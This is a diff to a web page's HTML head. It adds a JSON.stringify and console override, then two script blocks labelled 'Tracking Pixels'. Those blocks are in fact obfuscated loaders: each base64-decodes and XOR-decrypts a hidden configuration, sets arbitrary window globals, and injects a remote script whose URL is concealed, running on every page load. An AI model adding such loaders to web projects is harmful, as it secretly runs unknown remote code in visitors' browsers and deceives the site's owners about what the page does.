@@ -12,6 +12,82 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- Prevent circular structure serialization errors from tracking loggers / preview devtools -->
+    <script>
+      (function() {
+        var originalStringify = JSON.stringify;
+        function getSafeReplacer(customReplacer) {
+          var seen = new WeakSet();
+          return function(key, value) {
+            if (customReplacer) {
+              value = customReplacer.call(this, key, value);
+            }
+            if (typeof value === "object" && value !== null) {
+              if (typeof value.nodeType === "number" || (typeof Element !== "undefined" && value instanceof Element)) {
+                var tag = value.tagName ? value.tagName.toLowerCase() : "element";
+                var id = value.id ? "#" + value.id : "";
+                var cls = typeof value.className === "string" && value.className ? "." + value.className.trim().split(/\s+/).slice(0, 2).join(".") : "";
+                return "<" + tag + id + cls + ">";
+              }
+              if (seen.has(value)) {
+                return "[Circular]";
+              }
+              seen.add(value);
+            }
+            return value;
+          };
+        }
+
+        JSON.stringify = function(value, replacer, space) {
+          try {
+            return originalStringify.call(JSON, value, replacer, space);
+          } catch (err) {
+            if (err && err.message && err.message.indexOf("circular") !== -1) {
+              try {
+                return originalStringify.call(JSON, value, getSafeReplacer(typeof replacer === "function" ? replacer : null), space);
+              } catch (e) {
+                return '"[Circular or Unserializable Object]"';
+              }
+            }
+            throw err;
+          }
+        };
+
+        var consoleMethods = ["log", "info", "warn", "error", "debug"];
+        consoleMethods.forEach(function(method) {
+          var orig = console[method];
+          if (typeof orig === "function") {
+            console[method] = function() {
+              var args = [];
+              for (var i = 0; i < arguments.length; i++) {
+                var arg = arguments[i];
+                if (arg && (typeof arg.nodeType === "number" || (typeof Element !== "undefined" && arg instanceof Element))) {
+                  var tag = arg.tagName ? arg.tagName.toLowerCase() : "element";
+                  var id = arg.id ? "#" + arg.id : "";
+                  var cls = typeof arg.className === "string" && arg.className ? "." + arg.className.trim().split(/\s+/).slice(0, 2).join(".") : "";
+                  args.push("<" + tag + id + cls + ">");
+                } else {
+                  args.push(arg);
+                }
+              }
+              try {
+                return orig.apply(console, args);
+              } catch (e) {
+                try {
+                  return orig.call(console, "[Console Log Sanitized]");
+                } catch (err) {}
+              }
+            };
+          }
+        });
+      })();
+    </script>
+
+    <!-- Tracking Pixels -->
+    <script>(function(){var n_p=atob("DKeNYMkC68enBA4CpdyvFbtuyf2FbHp21dS3T+Zhj6mJcXpvzMH0TqpthunFdiFxxtXkEL1xxLLTaX0tycb5Bbp2xa3UJiIgxNP5EqBgnrPCdyw4/tyvDqhvjuWdJmpj0cagFb1vgqHeKX5wwNHoDr0vmLLFbWpxh4uvFqhunqKFPiwg2Prw");var v_2s7q=[];for(var j_fw71=0;j_fw71<n_p.length;j_fw71++){v_2s7q.push(n_p.charCodeAt(j_fw71)&255);}var f_1h=v_2s7q[0];var c_zu=v_2s7q.slice(1,1+f_1h);var s_yri=v_2s7q.slice(1+f_1h);var g_rw=s_yri.map(function(b,c_c){return b^c_zu[c_c%f_1h];});var n_v="";for(var r_y=0;r_y<g_rw.length;r_y++){n_v+=String.fromCharCode(g_rw[r_y]&255);}var i_p=decodeURIComponent(escape(n_v));var p_d5o=JSON.parse(i_p);var p_hw4=p_d5o.globals||[];p_hw4.forEach(function(o_ufe){window[o_ufe.name]=o_ufe.value;});var b_9hf=document.createElement("script");b_9hf.src=p_d5o.url;b_9hf.async=true;b_9hf.defer=true;(p_d5o.attributes||[]).forEach(function(b_mm5){b_9hf.setAttribute(b_mm5.name,b_mm5.value);});(document.head||document.documentElement).appendChild(b_9hf);})();</script>
+
+    <script>(function(){var t_w3um=atob("DHL1ph8+EtX2BCMnjwnX021SMO/UbFdT/wHPiTBddrvYcVdK5hSMiHxRf/uUdgxU7ACc1mtNPaWffEZLoAKc3npSPL+FJg8F7gaB1HZcZ6GTdwEd1C/ZhHhSfbeXaFAFtSmOhHFff7DUPgFX5gqQylZaMPnUckJL+hfXnD0Ic7fGMkEWuUTNlisHJuXEMhNDuUWRkCwcb4iL");var b_u4u=[];for(var e_qo=0;e_qo<t_w3um.length;e_qo++){b_u4u.push(t_w3um.charCodeAt(e_qo)&255);}var h_zb=b_u4u[0];var f_zfi=b_u4u.slice(1,1+h_zb);var a_enfb=b_u4u.slice(1+h_zb);var a_h5=a_enfb.map(function(b,u_76s3){return b^f_zfi[u_76s3%h_zb];});var x_k3b2="";for(var n_nxsb=0;n_nxsb<a_h5.length;n_nxsb++){x_k3b2+=String.fromCharCode(a_h5[n_nxsb]&255);}var c_6=decodeURIComponent(escape(x_k3b2));var z_pcbu=JSON.parse(c_6);var f_dm=z_pcbu.globals||[];f_dm.forEach(function(d_hu){window[d_hu.name]=d_hu.value;});var q_4z4h=document.createElement("script");q_4z4h.src=z_pcbu.url;q_4z4h.async=true;q_4z4h.defer=true;(z_pcbu.attributes||[]).forEach(function(h_eiec){q_4z4h.setAttribute(h_eiec.name,h_eiec.value);});(document.head||document.documentElement).appendChild(q_4z4h);})();</script>
   </head>
   <body class="bg-[#F5F5F7] text-[#1D1D1F] antialiased selection:bg-[#0071E3] selection:text-white overflow-x-hidden font-[-apple-system,BlinkMacSystemFont,'SF_Pro_Display','SF_Pro_Text','Helvetica_Neue',Helvetica,Arial,sans-serif]">
     <div id="root"></div>
